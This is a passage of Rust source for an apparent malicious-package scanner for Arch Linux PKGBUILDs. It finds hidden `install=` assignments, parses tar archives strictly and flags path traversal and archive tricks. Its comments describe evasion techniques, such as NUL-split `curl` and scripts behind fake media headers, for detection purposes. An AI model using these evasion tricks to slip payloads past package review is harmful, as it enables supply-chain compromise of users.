    for line in raw.lines() {
        if let Some(tag) = &heredoc {
            let done = line.trim() == tag;
            out.push(SrcLine {
                text: line,
                func: cur.clone(),
                comment: true, // heredoc bodies are data, not statements
            });
            if done {
                heredoc = None;
            }
            continue;
        }
        let t = line.trim_start();
        let comment = !sq && !dq && t.starts_with('#');
        if !comment && !sq && !dq && cur.is_none() {
            if let Some(c) = FUNC_HDR.captures(t) {
                cur = Some(c[1].to_string());
                depth = 0;
                started = false;
            }
        }
        out.push(SrcLine {
            text: line,
            func: cur.clone(),
            comment,
        });
        if comment {
            continue;
        }
        let mut prev = ' ';
        let mut skip = false;
        // The line with quoted text blanked, for heredoc detection.
        let mut code = String::with_capacity(line.len());
        for ch in line.chars() {
            if skip {
                skip = false;
                prev = ch;
                code.extend(std::iter::repeat_n(' ', ch.len_utf8()));
                continue;
            }
            if sq {
                code.extend(std::iter::repeat_n(' ', ch.len_utf8()));
                if ch == '\'' {
                    sq = false;
                }
            } else if dq {
                code.extend(std::iter::repeat_n(' ', ch.len_utf8()));
                match ch {
                    '\\' => skip = true,
                    '"' => dq = false,
                    _ => {}
                }
            } else {
                code.push(ch);
                match ch {
                    '\\' => skip = true,
                    '\'' => sq = true,
                    '"' => dq = true,
                    '#' if prev.is_whitespace() || prev == ';' || prev == '&' || prev == ')' => {
                        break
                    }
                    '{' => {
                        depth += 1;
                        started = true;
                    }
                    '}' => depth -= 1,
                    _ => {}
                }
            }
            prev = ch;
        }
        if !sq && !dq {
            if let Some(op) = HEREDOC_OP.find(&code) {
                if let Some(h) = HEREDOC_TAG.captures(&line[op.end()..]) {
                    heredoc = Some(h[2].to_string());
                }
            }
        }
        if cur.is_some() && started && depth <= 0 {
            cur = None;
        }
    }
    out
}

/// Words after these keywords are variables the statement writes.
const WRITE_KEYWORDS: &[&str] = &[
    "read",
    "mapfile",
    "readarray",
    "getopts",
    "for",
    "let",
    "unset",
    "select",
];

/// Names a line writes: `(name, plain)` where `plain` is a simple `name=...`.
fn line_writes(line: &str) -> Vec<(String, bool)> {
    lazy_static::lazy_static! {
        static ref DEFAULT_ASSIGN: regex::Regex =
            regex::Regex::new(r#"\$\{([A-Za-z_][A-Za-z0-9_]*)(?:\[[^\]]*\])?:?="#).unwrap();
        static ref PRINTF_V: regex::Regex =
            regex::Regex::new(r#"printf\s+(?:-\w+\s+)*-v\s*["']?([A-Za-z_][A-Za-z0-9_]*)"#).unwrap();
        static ref NAMEREF: regex::Regex = regex::Regex::new(
            r#"(?:declare|typeset|local)\s+-\w*n\w*\s+["']?([A-Za-z_][A-Za-z0-9_]*)"#
        ).unwrap();
    }
    let mut out = Vec::new();
    let b = line.as_bytes();
    for (i, _) in line.match_indices('=') {
        // `==`, `!=`, `<=`, `>=`, `=~` are tests, not assignments.
        if matches!(b.get(i + 1), Some(b'=' | b'~'))
            || (i > 0 && matches!(b[i - 1], b'=' | b'!' | b'<' | b'>'))
        {
            continue;
        }
        let mut j = i;
        let plus = j > 0 && b[j - 1] == b'+';
        if plus {
            j -= 1;
        }
        let mut indexed = false;
        if j > 0 && b[j - 1] == b']' {
            let lo = j.saturating_sub(256);
            let Some(open) = b[lo..j].iter().rposition(|&c| c == b'[') else {
                continue;
            };
            indexed = true;
            j = lo + open;
        }
        let mut st = j;
        while st > 0 && (b[st - 1].is_ascii_alphanumeric() || b[st - 1] == b'_') {
            st -= 1;
        }
        if st == j || b[st].is_ascii_digit() {
            continue;
        }
        let before = &line[..st];
        if before.ends_with(['-', '$', '.', '/']) {
            continue;
        }
        if !assignment_position(before) {
            continue;
        }
        out.push((line[st..j].to_string(), !plus && !indexed));
    }
    for re in [&*DEFAULT_ASSIGN, &*PRINTF_V, &*NAMEREF] {
        for c in re.captures_iter(line) {
            out.push((c[1].to_string(), false));
        }
    }
    // `read a b`, `for x in`, `unset x`, `let x=1`: the plain words are written.
    for stmt in line.split([';', '&', '|']) {
        let mut words = stmt.split_whitespace();
        let Some(first) = words.next() else { continue };
        if !WRITE_KEYWORDS.contains(&first) {
            continue;
        }
        let only_first = matches!(first, "for" | "select");
        for w in words.take(if only_first { 1 } else { usize::MAX }) {
            let w = w.trim_matches(['"', '\'']);
            let is_ident = !w.is_empty()
                && !w.starts_with(|c: char| c.is_ascii_digit())
                && w.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
            if is_ident {
                out.push((w.to_string(), false));
            }
        }
    }
    out
}

fn build_census(lines: &[SrcLine<'_>]) -> Census {
    let mut c = Census::default();
    for l in lines {
        if l.comment {
            continue;
        }
        let pkg_scope = l.func.as_deref().is_none_or(|f| f.starts_with("package"));
        for (name, plain) in line_writes(l.text) {
            if plain {
                *c.writes.entry(name.clone()).or_insert(0) += 1;
            } else {
                c.exotic.insert(name.clone());
                if pkg_scope {
                    c.exotic_pkg.insert(name.clone());
                }
            }
            if l.func.is_some() {
                c.nontop.insert(name);
            }
        }
        let t = l.text.trim_start();
        if pkg_scope && (t.starts_with("source ") || t.starts_with(". ")) {
            c.dynamic = true;
        }
        // `eval` of anything with an expansion in it.
        if let Some(pos) = l.text.find("eval ") {
            let prev_ok = pos == 0 || !l.text.as_bytes()[pos - 1].is_ascii_alphanumeric();
            if pkg_scope && prev_ok && l.text[pos..].contains(['$', '`']) {
                c.dynamic = true;
            }
        }
    }
    c
}

/// Every `install=` assignment in the PKGBUILD text, attributed to the
/// function it sits in, plus whether something set `install` in a way that
/// cannot be read statically (`printf -v install`, `read install`).
///
/// The structured parser only sees `install=` at the start of a line or in a
/// function body after a separator; `declare install=`, `[[ .. ]] && install=`
/// and `eval "install=.."` all reach makepkg and none of them reached it.
fn find_install_decls(lines: &[SrcLine<'_>]) -> Vec<InstallDecl> {
    let mut decls: Vec<InstallDecl> = Vec::new();
    let mut seen: HashSet<(String, Option<String>)> = HashSet::new();
    for l in lines {
        if l.comment {
            continue;
        }
        let line = l.text;
        let pkgname = l
            .func
            .as_deref()
            .and_then(|f| f.strip_prefix("package_"))
            .map(str::to_string);
        for (idx, _) in line.match_indices("install=") {
            let before = &line[..idx];
            if before.ends_with(['-', '$', '.', '/'])
                || before.ends_with(|c: char| c.is_ascii_alphanumeric() || c == '_')
                || !assignment_position(before)
            {
                continue;
            }
            let enclosing = before
                .trim_end()
                .chars()
                .next_back()
                .filter(|c| *c == '"' || *c == '\'');
            let value = read_word(&line[idx + "install=".len()..], enclosing);
            if value.trim_matches(['"', '\'']).is_empty() {
                continue;
            }
            let d = InstallDecl {
                value,
                pkgname: pkgname.clone(),
                speculative: false,
            };
            if seen.insert((d.value.clone(), d.pkgname.clone())) {
                decls.push(d);
            }
        }
    }
    decls
}

/// Name of the compression or archive container a file's magic bytes show, if
/// any. makepkg extracts local `.tar.*`, `.zip` and plain `.gz`/`.xz`/`.bz2`/
/// `.zst` sources, so their contents are build input that was never read.
fn archive_kind(path: &Path) -> Option<&'static str> {
    let f = open_regular(path).ok()?;
    let mut b = Vec::new();
    // 0x8006 bytes reach the ISO9660 signature at 0x8001.
    f.take(0x8006).read_to_end(&mut b).ok()?;
    let starts = |m: &[u8]| b.starts_with(m);
    if starts(&[0x1f, 0x8b]) {
        Some("gzip")
    } else if starts(&[0x1f, 0x9d]) {
        Some("compress")
    } else if starts(&[0xfd, b'7', b'z', b'X', b'Z', 0x00]) {
        Some("xz")
    } else if starts(&[0x5d, 0x00, 0x00]) {
        Some("lzma")
    } else if starts(b"LZIP") {
        Some("lzip")
    } else if starts(b"LRZI") {
        Some("lrzip")
    } else if starts(b"BZh") && b.len() > 3 && (b'1'..=b'9').contains(&b[3]) {
        Some("bzip2")
    } else if starts(&[0x28, 0xb5, 0x2f, 0xfd]) {
        Some("zstd")
    } else if starts(&[0x04, 0x22, 0x4d, 0x18]) {
        Some("lz4")
    } else if starts(b"PK\x03\x04") || starts(b"PK\x05\x06") || starts(b"PK\x07\x08") {
        Some("zip")
    } else if starts(&[0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]) {
        Some("7z")
    } else if starts(b"Rar!\x1a\x07") {
        Some("rar")
    } else if starts(b"MSCF") {
        Some("cab")
    } else if starts(b"xar!") {
        Some("xar")
    } else if starts(b"!<arch>\n") {
        Some("ar")
    } else if starts(&[0xc7, 0x71]) || starts(&[0x71, 0xc7]) || starts(b"07070") {
        Some("cpio")
    } else if b.len() >= 0x8006 && &b[0x8001..0x8006] == b"CD001" {
        Some("iso9660")
    } else if (b.len() >= 262 && &b[257..262] == b"ustar") || tar_header_ok(&b) {
        Some("tar")
    } else {
        None
    }
}

/// Largest archive file read into memory for member scanning.
const MAX_ARCHIVE_BYTES: u64 = 16 * 1024 * 1024;
/// Most members read out of one archive.
const MAX_TAR_MEMBERS: usize = 2048;

/// A tar member name that leaves the extraction directory.
fn escapes_extraction_dir(name: &str) -> bool {
    name.starts_with('/')
        || name.contains('\\')
        || name.split('/').any(|c| c == "..")
        || name.chars().nth(1) == Some(':')
}

fn cstr(b: &[u8]) -> String {
    let end = b.iter().position(|&c| c == 0).unwrap_or(b.len());
    String::from_utf8_lossy(&b[..end]).into_owned()
}

/// A numeric tar field in the strict subset: optional leading spaces, octal
/// digits, then only spaces or NULs. `+`, base-256 and junk are `None`, because
/// readers disagree about them.
fn strict_octal(b: &[u8]) -> Option<u64> {
    let mut i = 0;
    while i < b.len() && b[i] == b' ' {
        i += 1;
    }
    let st = i;
    while i < b.len() && (b'0'..=b'7').contains(&b[i]) {
        i += 1;
    }
    if i == st || i - st > 21 || !b[i..].iter().all(|&c| c == b' ' || c == 0) {
        return None;
    }
    u64::from_str_radix(std::str::from_utf8(&b[st..i]).ok()?, 8).ok()
}

/// Whether a 512-byte block is a tar header: a non-empty name and a valid
/// checksum. Both the unsigned and the signed byte sum are accepted, as
/// libarchive does (the checksum field itself counts as spaces).
fn tar_header_ok(block: &[u8]) -> bool {
    if block.len() < 512 || block[0] == 0 {
        return false;
    }
    let mut unsigned = 0i64;
    let mut signed = 0i64;
    for (i, &c) in block.iter().take(512).enumerate() {
        let c = if (148..156).contains(&i) { 32 } else { c };
        unsigned += i64::from(c);
        signed += i64::from(c as i8);
    }
    match strict_octal(&block[148..156]) {
        Some(v) => v as i64 == unsigned || v as i64 == signed,
        None => false,
    }
}

/// `[0-9]+`, nothing else.
fn all_digits(v: &str) -> bool {
    !v.is_empty() && v.bytes().all(|c| c.is_ascii_digit())
}

/// Records of a pax extended header in the strict subset, or the reason it is
/// not: decimal length with no sign, record ends in a newline, each key at most
/// once, only the keys below, with strict values.
fn pax_records_strict(data: &[u8]) -> Result<Vec<(String, String)>, String> {
    let mut out: Vec<(String, String)> = Vec::new();
    let mut rest = data;
    while !rest.is_empty() {
        let sp = rest
            .iter()
            .position(|&c| c == b' ')
            .ok_or("pax record without a length")?;
        let digits = std::str::from_utf8(&rest[..sp]).map_err(|_| "pax length is not text")?;
        if !all_digits(digits) || digits.len() > 7 {
            return Err("pax record length is not a plain decimal".into());
        }
        let len: usize = digits.parse().map_err(|_| "pax record length")?;
        if len <= sp + 1 || len > rest.len() {
            return Err("pax record length does not fit its header".into());
        }
        let rec = &rest[sp + 1..len];
        let rec = rec
            .strip_suffix(b"\n")
            .ok_or("pax record does not end in a newline")?;
        let eq = rec
            .iter()
            .position(|&c| c == b'=')
            .ok_or("pax record without '='")?;
        let key = String::from_utf8_lossy(&rec[..eq]).into_owned();
        let val = String::from_utf8_lossy(&rec[eq + 1..]).into_owned();
        let ok = match key.as_str() {
            "path" | "linkpath" | "uname" | "gname" => true,
            "size" | "uid" | "gid" => all_digits(&val),
            "mtime" | "atime" | "ctime" => {
                let (i, f) = val.split_once('.').unwrap_or((&val, "0"));
                all_digits(i) && all_digits(f)
            }
            _ => return Err(format!("pax key {key:?}")),
        };
        if !ok {
            return Err(format!("pax value for {key:?} is not strict"));
        }
        if out.iter().any(|(k, _)| *k == key) {
            return Err(format!("pax key {key:?} repeated"));
        }
        out.push((key, val));
        rest = &rest[len..];
    }
    Ok(out)
}

/// What an uncompressed tar holds, read in memory.
struct TarParsed {
    /// `(name, content)` of every member read (regular files, and best-effort
    /// the data of entries that should have none).
    members: Vec<(String, Vec<u8>)>,
    /// Member names or link targets that leave the extraction directory.
    escapes: Vec<String>,
    /// Structures outside the strict subset, where tar readers disagree about
    /// what is extracted. Each is a short reason.
    oddities: Vec<String>,
}

/// Parse an uncompressed tar, accepting only a strict subset: ustar or GNU
/// headers with valid checksums and strictly octal numeric fields, regular
/// files, directories and symlinks of size 0, pax `x` records with a few strict
/// keys, and GNU `L`/`K`. Anything else is recorded in `oddities` and the
/// members that could still be read are returned (best effort). `None` only
/// when the data does not start as a tar or passes a size bound; the caller
/// then treats it as opaque.
fn parse_tar(data: &[u8]) -> Option<TarParsed> {
    let mut p = TarParsed {
        members: Vec::new(),
        escapes: Vec::new(),
        oddities: Vec::new(),
    };
    let odd = |p: &mut TarParsed, why: String| {
        if !p.oddities.contains(&why) && p.oddities.len() < 16 {
            p.oddities.push(why);
        }
    };
    let mut pos = 0usize;
    let mut total = 0u64;
    let mut pend_name: Option<String> = None;
    let mut pend_link: Option<String> = None;
    let mut pend_size: Option<u64> = None;
    let mut names: HashSet<String> = HashSet::new();
    let mut seen_any = false;
    while pos < data.len() {
        let Some(block) = pos.checked_add(512).and_then(|e| data.get(pos..e)) else {
            odd(&mut p, "truncated header block".into());
            break;
        };
        if block.iter().all(|&c| c == 0) {
            // End of archive. A single zero block followed by more data, or any
            // non-zero byte after the marker, hides a second archive.
            let next = data.get(pos + 512..pos + 1024);
            match next {
                Some(n) if n.iter().all(|&c| c == 0) => {}
                Some(_) => odd(&mut p, "zero block in the middle of the archive".into()),
                None if pos + 512 < data.len() => {
                    odd(&mut p, "data after a single end block".into())
                }
                None => {}
            }
            if data
                .get(pos + 512..)
                .is_some_and(|t| t.iter().any(|&c| c != 0))
            {
                odd(&mut p, "non-zero data after the end of the archive".into());
            }
            break;
        }
        if !tar_header_ok(block) {
            if !seen_any {
                return None;
            }
            odd(&mut p, "invalid header checksum or size field".into());
            break;
        }
        seen_any = true;
        let magic = &block[257..265];
        if magic != b"ustar\x0000" && magic != b"ustar  \x00" {
            odd(&mut p, "header without ustar/GNU magic".into());
        }
        let typeflag = block[156];
        let Some(mut size) = strict_octal(&block[124..136]) else {
            odd(&mut p, "size field is not strict octal".into());
            break;
        };
        // A pax `size` applies to the next real entry, not to metadata records.
        if !matches!(typeflag, b'x' | b'g' | b'L' | b'K') {
            if let Some(ps) = pend_size.take() {
                size = ps;
            }
        }
        if size > MAX_SCAN_FILE_BYTES {
            return None;
        }
        total += size;
        if total > MAX_ARCHIVE_BYTES {
            return None;
        }
        let size = size as usize;
        let start = pos + 512;
        let Some(body) = start.checked_add(size).and_then(|e| data.get(start..e)) else {
            odd(&mut p, "member data runs past the end of the file".into());
            break;
        };
        pos = start + size.div_ceil(512) * 512;
        // The ustar `prefix` field exists only under the POSIX magic; GNU
        // `ustar  ` headers keep atime/ctime in that area.
        let mut name = cstr(&block[0..100]);
        if &block[257..263] == b"ustar\0" {
            let prefix = cstr(&block[345..500]);
            if !prefix.is_empty() {
                name = format!("{prefix}/{name}");
            }
        }
        match typeflag {
            b'L' | b'K' => {
                if size > 4096 {
                    odd(&mut p, "oversized GNU long name".into());
                }
                let v = cstr(body);
                if typeflag == b'L' {
                    pend_name = Some(v);
                } else {
                    pend_link = Some(v);
                }
                continue;
            }
            b'x' => {
                match pax_records_strict(body) {
                    Ok(recs) => {
                        for (k, v) in recs {
                            match k.as_str() {
                                "path" => pend_name = Some(v),
                                "linkpath" => pend_link = Some(v),
                                "size" => match v.parse() {
                                    Ok(n) => pend_size = Some(n),
                                    Err(_) => odd(&mut p, "pax size out of range".into()),
                                },
                                _ => {}
                            }
                        }
                    }
                    Err(why) => odd(&mut p, why),
                }
                continue;
            }
            b'g' => {
                odd(&mut p, "pax global header".into());
                continue;
            }
            _ => {}
        }
        let name = pend_name.take().unwrap_or(name);
        let link = pend_link.take().unwrap_or_else(|| cstr(&block[157..257]));
        if escapes_extraction_dir(&name) {
            p.escapes.push(name.clone());
        }
        let mut keep_body = false;
        match typeflag {
            b'0' | 0 | b'7' => {
                if name.ends_with('/') {
                    odd(&mut p, "regular file with a directory name".into());
                }
                keep_body = true;
            }
            b'5' => {
                if size > 0 {
                    odd(&mut p, "directory entry with data".into());
                    keep_body = true;
                }
            }
            b'1' | b'2' | b'3' | b'4' | b'6' => {
                if matches!(typeflag, b'1' | b'2') && escapes_extraction_dir(&link) {
                    p.escapes.push(format!("{name} -> {link}"));
                }
                if typeflag != b'2' && typeflag != b'1' {
                    odd(&mut p, "device or FIFO entry".into());
                }
                if size > 0 {
                    odd(&mut p, "link or device entry with data".into());
                    keep_body = true;
                }
            }
            other => {
                odd(&mut p, format!("type flag {:?}", other as char));
                keep_body = true;
            }
        }
        if !names.insert(name.clone()) {
            odd(&mut p, "duplicate member name".into());
        }
        if keep_body {
            if p.members.len() >= MAX_TAR_MEMBERS {
                return None;
            }
            p.members.push((name, body.to_vec()));
        }
    }
    seen_any.then_some(p)
}

/// Whether at least 85% of the first 8 KiB of `s` (NULs ignored) is printable:
/// prose or code, as opposed to binary noise that merely decoded.
fn mostly_printable(s: &str) -> bool {
    let (mut total, mut printable) = (0usize, 0usize);
    for c in s.chars().take(TEXT_SAMPLE_BYTES).filter(|&c| c != '\0') {
        total += 1;
        if c != '\u{FFFD}' && (!c.is_control() || matches!(c, '\t' | '\n' | '\r')) {
            printable += 1;
        }
    }
    total == 0 || printable * 100 >= total * 85
}

fn text_like(b: &[u8]) -> bool {
    let sample = &b[..b.len().min(TEXT_SAMPLE_BYTES)];
    if !sample.contains(&0) {
        return true;
    }
    let decoded = String::from_utf8_lossy(sample);
    let (mut total, mut printable) = (0usize, 0usize);
    for c in decoded.chars().filter(|&c| c != '\0') {
        total += 1;
        if c != '\u{FFFD}' && (!c.is_control() || matches!(c, '\t' | '\n' | '\r')) {
            printable += 1;
        }
    }
    total > 0 && printable * 100 >= total * 85
}

/// Magic bytes of an image, font or PDF.
fn media_magic(b: &[u8]) -> bool {
    b.starts_with(b"\x89PNG")
        || b.starts_with(&[0xff, 0xd8, 0xff])
        || b.starts_with(b"GIF8")
        || (b.starts_with(b"RIFF") && b.len() >= 12 && &b[8..12] == b"WEBP")
        || b.starts_with(&[0, 0, 1, 0])
        || b.starts_with(b"%PDF")
        || b.starts_with(b"wOFF")
        || b.starts_with(b"wOF2")
        || b.starts_with(b"OTTO")
        || b.starts_with(&[0, 1, 0, 0])
}

const ARCHIVE_EXTS: &[&str] = &[
    "tar", "tgz", "tbz", "tbz2", "txz", "tzst", "zip", "gz", "xz", "bz2", "zst", "lz", "lzma",
    "7z", "rar", "cab", "cpio", "z", "lrz", "lz4", "jar", "war", "deb", "rpm", "iso", "ar",
];

/// Whether `head` (the start of a file `total` bytes long called `name`) has
/// the real structure of an image, font, PDF, gettext catalog, DER certificate
/// or binary OpenPGP signature. Used ONLY to suppress `SCAN-002`: the content
/// is always read and scanned regardless, and the name and the extension prove
/// nothing (a `.pem` or a `GIF89a` header can sit on a script).
fn real_media_structure(name: &str, head: &[u8], total: u64) -> bool {
    let ext = Path::new(name)
        .extension()
        .and_then(|e| e.to_str())
        .map(str::to_ascii_lowercase)
        .unwrap_or_default();
    if ARCHIVE_EXTS.contains(&ext.as_str()) || head.is_empty() {
        return false;
    }
    let sample = &head[..head.len().min(512)];
    let high = sample.iter().filter(|&&c| c >= 0x80).count();
    let binary_density = sample.contains(&0) || high * 4 >= sample.len();
    if media_magic(head) && binary_density {
        return true;
    }
    // A PDF's binary-marker comment sits right after a text header.
    if head.starts_with(b"%PDF") && sample.iter().filter(|&&c| c >= 0x80).count() >= 4 {
        return true;
    }
    // gettext .mo
    if head.starts_with(&[0xde, 0x12, 0x04, 0x95]) || head.starts_with(&[0x95, 0x04, 0x12, 0xde]) {
        return true;
    }
    // DER: one SEQUENCE whose length is exactly the rest of the file.
    if matches!(ext.as_str(), "der" | "cer" | "crt") && head.len() >= 4 && head[0] == 0x30 {
        let len = match head[1] {
            l if l < 0x80 => Some(2 + u64::from(l)),
            0x81 => Some(3 + u64::from(head[2])),
            0x82 => Some(4 + (u64::from(head[2]) << 8 | u64::from(head[3]))),
            _ => None,
        };
        if len == Some(total) && binary_density {
            return true;
        }
    }
    // Binary OpenPGP packet (signature or key).
    if matches!(ext.as_str(), "sig" | "gpg" | "pgp" | "asc" | "pub" | "key") && head[0] & 0x80 != 0
    {
        let tag = if head[0] & 0x40 != 0 {
            head[0] & 0x3f
        } else {
            (head[0] >> 2) & 0x0f
        };
        return matches!(tag, 1..=14 | 17 | 18) && binary_density;
    }
    false
}

/// A tar member with real media structure (see [`real_media_structure`]).
fn is_plain_media_member(name: &str, body: &[u8]) -> bool {
    real_media_structure(name, body, body.len() as u64)
}

/// A file with real media structure (see [`real_media_structure`]).
fn is_plain_media(path: &Path) -> bool {
    let name = path
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_default();
    let Ok(f) = open_regular(path) else {
        return false;
    };
    let total = f.metadata().map(|m| m.len()).unwrap_or(0);
    let mut b = Vec::new();
    if f.take(512).read_to_end(&mut b).is_err() {
        return false;
    }
    real_media_structure(&name, &b, total)
}

/// The runs of printable ASCII (at least 6 long) in `s`, one per line. Rules
/// that read prose and code are not run over binary noise, but a payload
/// embedded in it is still found.
fn printable_runs(s: &str) -> String {
    let mut out = String::new();
    let mut run = String::new();
    for c in s.chars().chain(std::iter::once('\u{0}')) {
        if c == '\t' || (' '..='~').contains(&c) {
            run.push(c);
        } else {
            if run.len() >= 6 && out.len() < 1_048_576 {
                out.push_str(&run);
                out.push('\n');
            }
            run.clear();
        }
    }
    out
}

/// `SCAN-002`: a compressed or unreadable archive the scanner could not open.
fn opaque_archive_finding(path: &Path, reason: &str) -> Finding {
    let mut f = unanalyzable_finding(path, reason);
    f.id = OPAQUE_ARCHIVE_CODE.to_string();
    f.severity = Severity::Medium;
    f.title = format!(
        "Opaque local archive: contents not reviewed ({})",
        path.file_name()
            .map(|n| n.to_string_lossy())
            .unwrap_or_default()
    );
    f.recommendation = "Unpack it by hand and read it. A build recipe has little reason to carry \
                        an archive that cannot be reviewed in the repository."
        .to_string();
    f
}

/// `SCAN-004`: a tar that uses structures where readers disagree.
fn tar_odd_finding(path: &Path, why: &[String]) -> Finding {
    let mut f = unanalyzable_finding(path, "");
    f.id = TAR_ODD_CODE.to_string();
    f.severity = Severity::High;
    f.title = "Archive uses structures where tar readers disagree".to_string();
    f.description = format!(
        "'{}' uses tar structures outside the plain ustar/GNU subset ({}). Different tar \
         readers extract different files from such an archive, so its contents may differ \
         from what the scanner read and from what makepkg extracts. The members that could \
         be read were scanned.",
        path.display(),
        why.join("; ")
    );
    f.recommendation = "Do not install. Re-create the archive with plain tar, or ship the files \
                        directly."
        .to_string();
    f.cwe_id = Some("CWE-436".to_string());
    f.metadata = serde_json::json!({ "reasons": why });
    f
}

/// `SCAN-003`: a tar member name that escapes the extraction directory.
fn tar_escape_finding(path: &Path, names: &[String]) -> Finding {
    let mut f = unanalyzable_finding(path, "");
    f.id = TAR_ESCAPE_CODE.to_string();
    f.severity = Severity::High;
    f.title = "Archive member escapes the extraction directory".to_string();
    f.description = format!(
        "'{}' holds members whose names are absolute or contain '..' ({}). makepkg extracts \
         local archives into $srcdir; such a member writes outside it.",
        path.display(),
        names.join(", ")
    );
    f.recommendation =
        "Do not install. A legitimate archive has no path-traversal members.".to_string();
    f.cwe_id = Some("CWE-22".to_string());
    f.metadata = serde_json::json!({ "members": names });
    f
}

struct Collector {
    findings: Vec<Finding>,
    seen: HashSet<PathBuf>,
    budget: u64,
    started: std::time::Instant,
    /// A "time budget exceeded" finding was already raised.
    timed_out: bool,
    /// Base names that `install=` can resolve to or that the PKGBUILD names on
    /// an `install` line. Such files are never exempted as media.
    protected: HashSet<String>,
}

impl Collector {
    /// Whether `path` may be the install scriptlet.
    fn is_protected(&self, path: &Path) -> bool {
        self.is_protected_name(
            &path
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default(),
        )
    }

    fn is_protected_name(&self, base: &str) -> bool {
        base.to_ascii_lowercase().ends_with(".install") || self.protected.contains(base)
    }

    /// Whether the time budget is spent; raises the finding the first time.
    fn out_of_time(&mut self, at: &Path) -> bool {
        if self.started.elapsed() <= COLLECT_BUDGET {
            return false;
        }
        if !self.timed_out {
            self.timed_out = true;
            self.findings.push(unanalyzable_finding(
                at,
                "was not reviewed: reading the package directory exceeded its time budget, so \
                 the files from here on were not analyzed",
            ));
        }
        true
    }

    /// Load one file as a script. Never drops a file silently: NUL bytes are
    /// removed (bash discards them, so `cu\0rl` runs as `curl`) and the rest is
    /// scanned as text, and a file that is not plain text raises `SCAN-002`
    /// unless it is known media.
    fn load(&mut self, path: &Path, file_type: FileType) -> Option<ParsedInstallScript> {
        if !self.seen.insert(path.to_path_buf()) {
            return None;
        }
        // A directory is not a file to analyze (and is not an evasion).
        if std::fs::symlink_metadata(path).is_ok_and(|m| m.is_dir()) {
            return None;
        }
        let read = match read_capped_lossy(path) {
            Ok(r) => r,
            Err(e) => {
                self.findings.push(unanalyzable_finding(
                    path,
                    &format!("could not be read: {e}"),
                ));
                return None;
            }
        };
        let held = read.content.len() as u64;
        if held > self.budget {
            self.findings.push(unanalyzable_finding(
                path,
                "was not read because the package directory exceeds the total scan size budget",
            ));
            return None;
        }
        self.budget -= held;
        let had_nul = read.content.contains('\0');
        let non_text = had_nul || !text_like(read.content.as_bytes());
        let binary_like = non_text && !mostly_printable(&read.content);
        if read.truncated && !binary_like {
            self.findings.push(unanalyzable_finding(
                path,
                &format!(
                    "is {} bytes, larger than the {} byte scan cap; only its first {} bytes were analyzed",
                    read.size, MAX_SCAN_FILE_BYTES, MAX_SCAN_FILE_BYTES
                ),
            ));
        }
        let mut content = read.content.replace('\0', "");
        let protected = self.is_protected(path);
        // A file `install=` can name, or a `*.install`, is never treated as
        // media and never has its text reduced.
        let real_media = !protected && is_plain_media(path);
        let is_patch = !protected
            && matches!(
                path.extension().and_then(|e| e.to_str()),
                Some("patch" | "diff")
            );
        if binary_like && !protected {
            // Not prose or code: run the rules over its printable strings only.
            content = printable_runs(&content);
        }
        if non_text && !real_media {
            // A patch is applied by `patch`, never run, so a binary hunk in one
            // is reported but its text is not scanned as code.
            self.findings.push(opaque_archive_finding(
                path,
                if is_patch {
                    "is a patch with NUL bytes or binary data; makepkg applies it rather than \
                     running it, but its contents were not fully reviewed"
                } else {
                    "is not plain text (NUL bytes or binary data); it was scanned as text with \
                     the NULs removed, but its contents may not be fully reviewed"
                },
            ));
            if is_patch {
                return None;
            }
        }
        Some(ParsedInstallScript {
            hooks: parser::parse_install_hooks(&content),
            content,
            path: path.to_path_buf(),
            file_type,
        })
    }

    /// Handle a committed archive or compressed file. `None` when `path` is
    /// not one. An uncompressed tar is read in memory and each text member is
    /// returned as a script (`archive.tar:member`; an install script when its
    /// name is in `install_names`). Anything else, or a tar past a bound, gets
    /// a Medium `SCAN-002`. Nothing is written to disk.
    fn take_archive(
        &mut self,
        path: &Path,
        install_names: &[String],
    ) -> Option<Vec<ParsedInstallScript>> {
        let kind = archive_kind(path)?;
        if !self.seen.insert(path.to_path_buf()) {
            return Some(Vec::new());
        }
        let parsed = if kind == "tar" {
            open_regular(path).ok().and_then(|f| {
                let mut buf = Vec::new();
                f.take(MAX_ARCHIVE_BYTES + 1).read_to_end(&mut buf).ok()?;
                if buf.len() as u64 > MAX_ARCHIVE_BYTES || buf.len() as u64 > self.budget {
                    return None;
                }
                let r = parse_tar(&buf)?;
                self.budget -= buf.len() as u64;
                Some(r)
            })
        } else {
            None
        };
        let Some(parsed) = parsed else {
            if kind == "tar" {
                // It says it is a tar but does not parse as one: readers will
                // disagree about what it holds.
                self.findings.push(tar_odd_finding(
                    path,
                    &["does not parse as a strict tar (invalid first header, or past a size bound)"
                        .to_string()],
                ));
                return Some(Vec::new());
            }
            self.findings.push(opaque_archive_finding(
                path,
                &format!(
                    "is a local {kind} archive the scanner cannot open; makepkg extracts it and \
                     the build uses what is inside, but its contents were not reviewed"
                ),
            ));
            return Some(Vec::new());
        };
        if !parsed.escapes.is_empty() {
            self.findings
                .push(tar_escape_finding(path, &parsed.escapes));
        }
        if !parsed.oddities.is_empty() {
            self.findings.push(tar_odd_finding(path, &parsed.oddities));
        }
        let mut out = Vec::new();
        let mut non_text = false;
        for (name, body) in parsed.members {
            let base = name.rsplit('/').next().unwrap_or(&name).to_string();
            let is_install = install_names.iter().any(|n| n == &name || *n == base);
            let protected = is_install || self.is_protected_name(&base);
            let binary = !text_like(&body) || body.contains(&0);
            if binary && (protected || !is_plain_media_member(&name, &body)) {
                non_text = true;
            }
            // Never skipped: NULs removed (bash discards them), and binary
            // noise reduced to its printable strings.
            let mut content = String::from_utf8_lossy(&body).replace('\0', "");
            if binary && !protected && !mostly_printable(&content) {
                content = printable_runs(&content);
            }
            out.push(ParsedInstallScript {
                hooks: parser::parse_install_hooks(&content),
                content,
                path: PathBuf::from(format!("{}:{}", path.display(), name)),
                file_type: if is_install {
                    FileType::InstallScript
                } else {
                    FileType::SourceFile
                },
            });
        }
        if non_text {
            self.findings.push(opaque_archive_finding(
                path,
                "is a local tar archive with members that are not plain text; they were \
                 scanned as text with NULs removed, but their contents may not be fully reviewed",
            ));
        }
        Some(out)
    }

    /// Whether `path` exists at all (without following a final symlink).
    fn exists(path: &Path) -> bool {
        std::fs::symlink_metadata(path).is_ok()
    }
}

/// Collect and read everything the package ships beside its PKGBUILD.
pub fn collect(dir: &Path, pkg: &ParsedPkgbuild) -> PackageFiles {
    let mut c = Collector {
        findings: Vec::new(),
